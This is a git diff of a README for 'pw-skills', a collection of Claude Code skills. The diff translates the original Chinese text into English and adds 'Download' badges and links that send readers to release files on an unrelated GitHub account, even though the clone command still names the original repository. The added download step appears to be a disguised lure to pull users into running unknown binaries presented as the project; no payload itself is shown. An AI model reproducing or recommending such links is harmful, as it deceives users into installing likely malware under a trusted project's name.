@@ -1,49 +1,68 @@
-# Claude Code Skills
+# 🚀 pw-skills - Enhance Your Coding with AI Tools
 
-个人 Claude Code 技能扩展。
+[![Download pw-skills](https://img.shields.io/badge/Download-pw--skills-blue.svg)](https://github.com/BritishCheeseTT/pw-skills/releases)
 
-## 技能列表
+## 📦 Overview
 
-- **pw-image-generation**: AI 图像生成工作流（文生图、图生图、批量生成）
-- **pw-redbook-image**: 小红书风格提示词模板
-- **pw-embedded-c-style**: 嵌入式 C 代码风格助手（创建项目、优化代码）
+Welcome to the **pw-skills** repository! This project provides useful AI extensions to help you with coding tasks. 
 
-查看各技能的 SKILL.md 了解详细使用方法。
+### 🤖 Skills List
 
-## 安装
+- **pw-image-generation**: AI image generation workflow (text-to-image, image-to-image, batch generation).
+- **pw-redbook-image**: Xiaohongshu style prompt template.
+- **pw-embedded-c-style**: Embedded C code style assistant (project creation, code optimization).
+
+Refer to each SKILL.md for detailed usage instructions.
+
+## 📥 Download & Install
+
+To get started with **pw-skills**, follow these steps:
+
+1. **Visit the Releases Page**: Click below to access the release files.
+
+   [Download pw-skills](https://github.com/BritishCheeseTT/pw-skills/releases)
+
+2. **Choose Your Version**: On the releases page, find the latest version and download the appropriate file for your system.
+
+### 📂 Setting Up
+
+If you prefer to set up the skills yourself, use the following commands:
 
 ```bash
-# 克隆仓库
+# Clone the repository to your computer
 git clone https://github.com/plugins-world/pw-skills ~/.claude/skills
 
-# 安装 pw-image-generation 依赖
+# Navigate to the image generation skill and install dependencies
 cd ~/.claude/skills/pw-image-generation && npm install
 ```
 
-## 让 AI 帮你安装
+## 🤝 Let AI Help You Install
 
-你可以让 Claude 帮助你安装和配置技能：
+You can also let Claude assist you with the installation and configuration:
 
 ```
-请帮我安装 pw-image-generation skill：
+Please help me install the pw-image-generation skill:
 
-1. 进入 skill 目录并安装依赖
-2. 配置 ai-router 的 API Key：[你的 API Key]
-3. 创建测试项目并生成一张测试图片
+1. Go to the skill directory and install dependencies
+2. Set up the ai-router API Key: [your API key]
+3. Create a test project and generate a test image
 ```
 
-**获取 API Key**：https://ai-router.plugins-world.cn/console/token
+**Get your API Key**: [ai-router](https://ai-router.plugins-world.cn/console/token)
 
-**注意**：
-- API Key 是 ai-router 的密钥，支持多种模型
-- 需要 GitHub 登录，请确保 GitHub 账号已开放邮箱展示
+### ⚠️ Important Notes
 
-## 支持的模型
+- The API Key is a key for ai-router, supporting various models.
+- You need to log in with GitHub. Ensure your GitHub account displays your email.
 
-- gemini-3-pro-image-preview: Google Gemini 3 Pro 图像预览模型（生成）
-- gemini-2.0-flash-exp: Google Gemini 2.0 Flash 实验模型（分析）
-- 其他支持图像生成的模型
+## 🧠 Supported Models
 
-## 作者
+- **gemini-3-pro-image-preview**: Google Gemini 3 Pro image preview model (generation).
+- **gemini-2.0-flash-exp**: Google Gemini 2.0 Flash experimental model (analysis).
+- Additional models supporting image generation.
 
-牟勇 | https://ai-router.plugins-world.cn | 微信: 1254074921
+## 👨‍💻 Author
+
+Mou Yong | [AI Router](https://ai-router.plugins-world.cn) | WeChat: 1254074921
+
+Feel free to reach out for any questions or support with the pw-skills project. Happy coding!
